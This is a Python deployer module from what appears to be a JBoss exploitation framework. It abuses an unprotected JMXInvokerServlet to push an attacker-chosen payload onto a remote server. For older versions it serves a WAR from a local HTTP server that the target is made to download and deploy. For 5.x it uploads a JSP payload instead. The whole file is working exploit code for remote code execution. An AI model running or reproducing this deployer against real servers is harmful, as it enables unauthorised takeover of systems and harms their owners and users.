from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import _serve, invkdeploy, waitServe
from threading import Thread
from os.path import abspath
from requests import get
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
title = JINTERFACES.JIN
def deploy(fingerengine, fingerprint):
    """ This deployer attempts to deploy to the JMXInvokerServlet, often
    left unprotected.  For versions 3.x and 4.x we can deploy WARs, but for 5.x
    the HttpAdaptor invoker is broken (in JBoss), so instead we invoke 
    the DeploymentFileRepository method.  This requires a JSP instead of a WAR.
    """

    war_file = fingerengine.options.deploy
    war_name = war_file.rsplit("/", 1)[1]

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/JMXInvokerServlet".format(
                   fingerengine.options.ip, fingerprint.port)
    local_url = "http://{0}:8000/{1}".format(utility.local_address(), war_name)

    # the attached fingerprint doesnt have a version; lets pull one of the others
    # to fetch it.  dirty hack.
    fp = [f for f in fingerengine.fingerprints if f.version != 'Any']
    if len(fp) > 0:
        fp = fp[0]
    else:
        ver = utility.capture_input("Could not reliably determine version, "
                                    "please enter the remote JBoss instance"
                                    " version: ")
        if len(ver) > 0:
            if '.' not in ver:
                ver += '.0'

            if ver not in versions:
                utility.Msg("Failed to find a valid fingerprint for deployment.", LOG.ERROR)
                return
            else:
                fp = fingerprint
                fp.version = ver
        else:
            return

    if fp.version in ["5.0", "5.1"]:
        if '.war' in war_file:
            utility.Msg("Deploying via an exposed invoker for JBoss "
                        " 5.x requires a JSP payload.", LOG.ERROR)
            return

        response = invkdeploy(fp.version, url, abspath(war_file))
        
        if len(response) > 1:
            utility.Msg(response, LOG.DEBUG)
        else:
            utility.Msg("{0} deployed to {1}".format(war_file,
                                    fingerengine.options.ip), LOG.SUCCESS)
    else:
        # start the local HTTP server
        server_thread = Thread(target=_serve, args=(war_file,))
        server_thread.start()

        # run serialization code
        response = invkdeploy(fp.version, url, local_url)

        if waitServe(server_thread):
            utility.Msg("{0} deployed to {1}".format(war_file, 
                                    fingerengine.options.ip), LOG.SUCCESS)
        else:
            utility.Msg("JMXInvokerServlet not vulnerable", LOG.ERROR)

        try:
            get("http://localhost:8000/", timeout=1.0)
        except:
            pass
